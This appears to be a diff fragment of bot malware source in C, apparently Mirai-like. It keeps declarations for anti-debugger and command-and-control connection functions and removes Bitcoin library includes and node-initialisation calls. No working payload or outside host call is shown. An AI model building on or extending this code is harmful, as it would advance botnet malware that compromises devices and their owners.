@@ -24,11 +24,6 @@
 #include "util.h"
 #include "resolv.h"
 
-//#include "btc.h"
-#include "ecc.h"
-#include "net.h"
-//#include "../btc/include/ecc.h"
-
 static void anti_gdb_entry(int);
 static void resolve_cnc_addr(void);
 static void establish_connection(void);
@@ -104,9 +99,6 @@ int main(int argc, char **args)
     if (sigaction(SIGBUS, &sa, NULL) == -1)
         perror("sigaction");
 #endif
-
-btc_ecc_start();
-btc_node* node = btc_node_new(); //NOTE necessary?
 
     LOCAL_ADDR = util_local_addr();
 
